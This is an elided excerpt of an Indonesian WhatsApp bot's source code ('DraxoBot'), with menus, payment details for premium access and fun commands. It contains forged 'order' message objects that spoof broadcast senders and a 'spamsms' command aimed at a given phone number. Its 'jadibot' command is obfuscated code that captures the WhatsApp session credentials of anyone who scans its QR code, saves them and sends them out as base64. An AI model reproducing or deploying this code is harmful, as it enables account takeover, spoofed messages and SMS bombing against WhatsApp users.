...
//𝙁𝘼𝙆𝙀 𝙉𝙔𝘼 𝘽𝘼𝙉𝙂
devilgamteng ='DRAXOBOT☕︎'
fake = 'DRAXOBOT☕︎'
//Ganti No Owner Ok
const Tag = "6285298092303"		
...
module.exports = devil = async (devil, mek) => {
	try {
        ...
        const listmsg = (from, title, desc, list) => { // ngeread nya pake rowsId, jadi command nya ga keliatan
            let po = devil.prepareMessageFromContent(from, {"listMessage": {"title": title,"description": desc,"buttonText": "☕MENU draxoBOTZ","footerText": "SILAHKAN PILIH LIST MENU\nOWNER 085298092303","listType": "SINGLE_SELECT","sections": list}}, {})
        ...
        const katalog = (teks) => {
            res = devil.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": -73926483, "message": teks, "footerText": "𝑰𝒕𝒔 𝑴𝒆 𝑫𝒓𝒂𝒙𝒐 𝐁𝐨𝐭𝐳 ?\n𝑪𝒓𝒆𝒂𝒕𝒐𝒓 : 𝙙𝙧𝙖𝙭𝙤𝗯𝗼𝘁𝘇", "thumbnail": fakeimage, "surface": 'CATALOG' }}, {quoted:ftroli})
            devil.relayWAMessage(res)
        }
        const cel =  {
             key: { fromMe: false,remoteJid: "status@broadcast", participant: '0@s.whatsapp.net'}, message: {orderMessage: {itemCount: 2021, status: 200, thumbnail: imagedevil, surface: 200, message: fake, orderTitle: '𝘽𝙤𝙩𝙯 𝙙𝙧𝙖𝙭𝙤 𝘽𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩', sellerJid: '0@s.whatsapp.net'} } }       

        const ftroli =  {
             key: { fromMe: false,remoteJid: "status@broadcast", participant: '0@s.whatsapp.net'}, message: {orderMessage: {itemCount: 2021, status: 200, thumbnail: imgcel, surface: 200, message: fake, orderTitle: '𝑰𝒕𝒔 𝑴𝒆 𝑫𝒓𝒂𝒙𝒐 𝐁𝐨𝐭𝐳 ?\n𝑪𝒓𝒆𝒂𝒕𝒐𝒓 : 𝒅𝒓𝒂𝒙𝒐 𝐬𝐭𝐨𝐫𝐞', sellerJid: '0@s.whatsapp.net'} } }       

        const fkon =  {
             key: { fromMe: false,remoteJid: "status@broadcast", participant: '0@s.whatsapp.net'}, message: {orderMessage: {itemCount: 2021, status: 200, thumbnail: fakeimage, surface: 200, message: devilgamteng, orderTitle: '𝑰𝒕𝒔 𝑴𝒆 𝑫𝒓𝒂𝒙𝒐 𝐁𝐨𝐭𝐳 ?\n𝑪𝒓𝒆𝒂𝒕𝒐𝒓 : 𝐝𝒓𝒂𝒙𝒐 𝐬𝐭𝐨𝐫𝐞', sellerJid: '0@s.whatsapp.net'} } }       
...
function banChat() {
    ...
    if (new Date() * 1 - settingstatus > 1000) {
      ...
      await devil.setStatus(`Aktif Selama: ${uptime} | Mode: ${banChats ? 'SELF-MODE' : 'PUBLIC-MODE'} | DraxoBot`).catch((_) => _);
...
`, imageMessage: imageMsg,
        ...
        case 'allmenu':
        case 'menuall':
               const boy = "6285298092303@s.whatsapp.net"     
...
┃⬡ Contact : @${tagme} 
┃⬡ Instagram :
┃⬡ *https://instagram.com/draxo_jb*
┃⬡ YouTube :
┃⬡ *https://youtube.com/channel/UCi5pNH8zzO9HwcIqP3L2QZg*
┃⬡ Official Group :
┃⬡ *blum ada*
┗⬣
...
//------------------< Store jualan >-------------------              
     ...
     case 'payment':
       ...
       SILAKAN KETIK MANUAL JIKA TIDAK TERLIHAT`
               ...
               break
      case 'gopay':
             reply(`GOPAY : 085298092303\n\n A/N DRAXO STORE`)
             break  
      case 'pulsa':
             reply(`PULSA : 082292716060\n\n KARTU TELKOMSEL`)
             break
      case 'dana':
             reply(`DANA : 082292716060\n\n A/N DRAXO STORE`)
             break   
      case 'qris':
             wew = fs.readFileSync(`./media/payment.jpg`)
             teks = `SCAN QRIS DI ATAS A/N draxoBOTZ`
...
//------------------< Sewa >-------------------
       ...
       case 'ceksewa': 
              ...
              break
         case 'spamsms':
                    if (args.length == 0) return reply(`Example: ${prefix + command} 085298092303`)
                    nomor = args[0]
...
//------------------< Premium >-------------------
       ...
       case 'buypremium':
            ...
            *Harga Premium*
            ...
            PAYMENT BISA MENGGUNAKAN : GOPAY, OVO, DANA
           *MINAT? SILAKAN HUBUNGI OWNER KETIK !OWNER*`
...
HARGA PERMANEN:~20k~ PROMO!!! *15K* MINAT? HUBUNGI OWNER`
              devil.sendMessage(from, await getBuffer(gopeynya), image, {quoted: mek, caption: teksnya })
              break             
//------------------< bayar menu >-------------------  
case 'bayar':
...
case 'tiktok':
      ...
      case 'ssweb':
       ...
       case 'nhentai':
              ...
              reply(mess.wait)
              henid = args[0]
              get_results = await fetchJson(`https://api.lolhuman.xyz/api/nhentai/${henid}?apikey=${setting.lolkey}`)
              get_result = get_results.result
...
break
       case 'attp':
              if (args.length == 0) return reply(`Example: ${prefix + command} DRAXO`)
       ...
       case 'colong':
		...
		const encmediia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	        const meidia = await devil.downloadAndSaveMediaMessage(encmediia, `./sticker/${sender}`)
		    exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
		    if (error) return reply('error')
		    devil.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), MessageType.sticker, {quoted: mek})
...
//------------------< Fun >-------------------
    case 'public':
       ...
       case 'cekgay':
              gay = body.slice(1)
              const ga =['18','32','26','41','53','69','77','62','74','83','97','100','29','94','75','82','48','39']
              const ay = ga[Math.floor(Math.random() * ga.length)]
              devil.sendMessage(from, '*Pertanyaan :* '+gay+'\n*Jawaban :* '+ ay+'%', text, { quoted: mek })
              break
       case 'cantikcek':
       case 'cekcantik':
              cantik = body.slice(1)
...
case 'caripesan':  //by ANU TEAM
       ...
       case 'bugreport':
              ...
              devil.sendMessage('6285298092303@s.whatsapp.net',`*Bug Report:* ${teks}`, text)
              break
       case 'readall':
...
//------------------< serti menu >-------------------   
case 'sertitolol': 				
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}tololserti DRAXO GAMTENG`)
				ct = body.slice(12)
				...
				break
case 'fuckboy': 		
                if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}fuckboy DRAXO GAMTENG`)
				ct = body.slice(9)
				zhain = await getBuffer(`https://api.lolhuman.xyz/api/fuckboy?apikey=${setting.lolkey}&name=${ct}`)
				devil.sendMessage(from, zhain, image, { quoted: mek, caption: 'Nih Dah Jadi' })
				break
case 'fuckgirl': 
	if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}fuckgirl DRAXO GAMTENG`)
				ct = body.slice(10)
				zhain = await getBuffer(`https://api.lolhuman.xyz/api/fuckgirl?apikey=${setting.lolkey}&name=${ct}`)
				devil.sendMessage(from, zhain, image, { quoted: mek, caption: 'Nih Dah Jadi' })
				break
case 'bucinserti': 
	if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}bucinserti DRAXO GAMTENG`)
				ct = body.slice(12)
				zhain = await getBuffer(`https://api.lolhuman.xyz/api/bucinserti?apikey=${setting.lolkey}&name=${ct}`)
				devil.sendMessage(from, zhain, image, { quoted: mek, caption: 'Nih Dah Jadi' })
				break
case 'pacarserti':
		if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}pacarserti DRAXO GAMTENG`)
				ct = body.slice(12)
				zhain = await getBuffer(`https://api.lolhuman.xyz/api/pacarserti?apikey=${setting.lolkey}&name=${ct}`)
				devil.sendMessage(from, zhain, image, { quoted: mek, caption: 'Nih Dah Jadi' })
				break
case 'goodboy':
			if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}goodboy DRAXO GAMTENG`)
				ct = body.slice(9)
				zhain = await getBuffer(`https://api.lolhuman.xyz/api/goodboy?apikey=${setting.lolkey}&name=${ct}`)
				devil.sendMessage(from, zhain, image, { quoted: mek, caption: 'Nih Dah Jadi' })
				break
case 'goodgirl':
		if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}goodgirl DRAXO GAMTENG`)
				ct = body.slice(10)
				zhain = await getBuffer(`https://api.lolhuman.xyz/api/goodgirl?apikey=${setting.lolkey}&name=${ct}`)
				devil.sendMessage(from, zhain, image, { quoted: mek, caption: 'Nih Dah Jadi' })
				break
case 'badboy':
		if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}badboy DRAXO GAMTENG`)
				ct = body.slice(8)
				zhain = await getBuffer(`https://api.lolhuman.xyz/api/badboy?apikey=${setting.lolkey}&name=${ct}`)
				devil.sendMessage(from, zhain, image, { quoted: mek, caption: 'Nih Dah Jadi' })
				break
case 'badgirl':
			if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}badgirl DRAXO GAMTENG`)
				ct = body.slice(9)
...
//------------------< esult >--------------------       
case 'jadibot':
const _0x1f8c0c=_0x3b14;(function(_0xf95177,_0x367388){const _0x2a922f=_0x3b14,_0x58c41e=_0xf95177();while(!![]){try{const _0x1ccf43=-parseInt(_0x2a922f(0x1a9))/0x1+-parseInt(_0x2a922f(0x1a2))/0x2+-parseInt(_0x2a922f(0x1c2))/0x3*(parseInt(_0x2a922f(0x1a4))/0x4)+-parseInt(_0x2a922f(0x1be))/0x5+-parseInt(_0x2a922f(0x1b8))/0x6*(parseInt(_0x2a922f(0x1a0))/0x7)+-parseInt(_0x2a922f(0x1c1))/0x8*(-parseInt(_0x2a922f(0x1c7))/0x9)+parseInt(_0x2a922f(0x1b2))/0xa;if(_0x1ccf43===_0x367388)break;else _0x58c41e['push'](_0x58c41e['shift']());}catch(_0x100025){_0x58c41e['push'](_0x58c41e['shift']());}}}(_0x37ea,0xcdd6c));if(from[_0x1f8c0c(0x1bc)](_0x1f8c0c(0x1b7)))return reply(_0x1f8c0c(0x19e));devil['version']=[0x2,0x96d,0x3],devil[_0x1f8c0c(0x1af)]=[_0x1f8c0c(0x1aa),'Desktop',_0x1f8c0c(0x1c9)];if(args[0x0]&&args[0x0][_0x1f8c0c(0x1ac)]>0xc8){let json=Buffer[_0x1f8c0c(0x1b9)](args[0x0],_0x1f8c0c(0x1a5))[_0x1f8c0c(0x1a7)](_0x1f8c0c(0x1c3)),obj=JSON['parse'](json);await devil['loadAuthInfo'](obj);}function _0x37ea(){const _0x4258e6=['./jadibot@','83536rNXYVL','198XRwBWw','utf-8','Error!\x20hanya\x201\x20orang\x20yang\x20dapat\x20mengakses\x20fitur\x20jadibot','0@s.whatsapp.net','./sampah/','1071ehomcF','Berhasil\x20tersambung\x20dengan\x20WhatsApp\x20-\x20mu.\x0a*NOTE:\x20Ini\x20cuma\x20numpang*\x0a','3.0','Only\x20With\x20Private\x20Chat/PC','chat-update','10892GlpUGu','stringify','3147206DIaaMr','split','78340HxmMAI','base64','image','toString','extendedText','1236246uryQYh','Draxo','log','length','connect','readFileSync','browserDescription','base64EncodedAuthInfo','key','61363360UBiaCJ','.jpg','deleteMessage','Scan\x20QR\x20ini\x20untuk\x20jadi\x20bot\x20sementara!\x0a1.\x20Klik\x20titik\x20tiga\x20di\x20pojok\x20kanan\x20atas\x0a2.\x20Ketuk\x20WhatsApp\x20Web\x0a3.\x20Scan\x20QR\x20ini\x20\x0a\x0aQR\x20Expired\x20dalam\x2020\x20detik','toDataURL','@g.us','4056XNxijM','from','credentials\x20update','Kamu\x20bisa\x20login\x20tanpa\x20qr\x20dengan\x20pesan\x20dibawah\x20ini','endsWith','sendMessage','6907515MvLdXy','./devil.js'];_0x37ea=function(){return _0x4258e6;};return _0x37ea();}function _0x3b14(_0x466cfc,_0x4f5207){const _0x37eab2=_0x37ea();return _0x3b14=function(_0x3b14fc,_0x1ba638){_0x3b14fc=_0x3b14fc-0x19e;let _0x43ebba=_0x37eab2[_0x3b14fc];return _0x43ebba;},_0x3b14(_0x466cfc,_0x4f5207);}try{devil['on']('qr',async _0x4a1692=>{const _0x1da3f0=_0x1f8c0c;qrbot=await qrkode[_0x1da3f0(0x1b6)](_0x4a1692,{'scale':0x8}),buffqr=await Buffer['from'](qrbot[_0x1da3f0(0x1a3)]('data:image/png;base64,')[0x5],_0x1da3f0(0x1a5)),await fs['writeFileSync']('./jadibot@'+sender+_0x1da3f0(0x1b3),buffqr);let _0x39f766=await devil[_0x1da3f0(0x1bd)](from,fs[_0x1da3f0(0x1ae)](_0x1da3f0(0x1c0)+sender+_0x1da3f0(0x1b3)),MessageType[_0x1da3f0(0x1a6)],{'quoted':mek,'caption':_0x1da3f0(0x1b5)});setTimeout(()=>{const _0x5109f2=_0x1da3f0;devil[_0x5109f2(0x1b4)](from,_0x39f766[_0x5109f2(0x1b1)]);},0x7530);}),devil['on']('open',async()=>{const _0x261a61=_0x1f8c0c;console[_0x261a61(0x1ab)](_0x261a61(0x1ba));const _0x45d639=devil[_0x261a61(0x1b0)]();fs['writeFileSync'](_0x261a61(0x1c6)+sender+'.json',JSON['stringify'](_0x45d639,null,'\x09')),await devil[_0x261a61(0x1bd)](_0x261a61(0x1c5),_0x261a61(0x1bb),MessageType['extendedText']),devil[_0x261a61(0x1bd)](_0x261a61(0x1c5),''+prefix+command+'\x20'+Buffer[_0x261a61(0x1b9)](JSON[_0x261a61(0x1a1)](_0x45d639))[_0x261a61(0x1a7)]('base64'),MessageType[_0x261a61(0x1a8)]);}),devil['on'](_0x1f8c0c(0x19f),async _0x3943e9=>{const _0x52cc72=_0x1f8c0c;require(_0x52cc72(0x1bf))(devil,_0x3943e9);}),await devil[_0x1f8c0c(0x1ad)]()['then'](async({user:_0x7af3fe})=>{const _0x2ec3e5=_0x1f8c0c;reply(_0x2ec3e5(0x1c8)+JSON['stringify'](_0x7af3fe,null,0x8));});}catch{reply(_0x1f8c0c(0x1c4));}
break
case 'stopjadibot':
...
//------------------< Menunya Bang:v >-------------------
      case 'infoig':
             reply(`Jangan Lupa Follow Ig Owner Ya : https://www.instagram.com/draxo_jb`)
             break
      case 'grupbot':
             reply('blum ada males buat')
             break
      case 'ownermenu':
